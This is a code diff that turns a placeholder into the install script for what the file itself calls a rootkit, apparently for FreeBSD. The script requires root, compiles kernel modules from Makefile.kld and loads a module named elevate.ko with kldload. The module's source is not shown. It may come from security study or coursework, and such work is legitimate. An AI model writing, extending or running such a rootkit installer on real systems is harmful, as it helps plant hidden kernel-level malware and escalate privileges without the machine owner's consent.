@@ -1,3 +1,29 @@
 #!/bin/sh
 
-echo "This script will install the rootkit!"
+uid=$(id -u)
+
+if [ "$uid" -ne 0 ]; then
+  echo "Install script must be executed as root"
+  exit 1
+fi
+
+# Clean working directory before compiling, make sure klds are recompiled
+make -f Makefile.kld clean
+
+# Compile KLDs
+make -f Makefile.kld
+
+if [ "$?" -ne 0 ]; then
+  echo "Error: failed to compile KLDs with make"
+  exit 1
+fi
+
+# Load klds
+kldload ./elevate.ko
+
+if [ "$?" -ne 0 ]; then
+  echo "Error: failed to load elevate.ko with kld"
+  exit 1
+fi
+
+
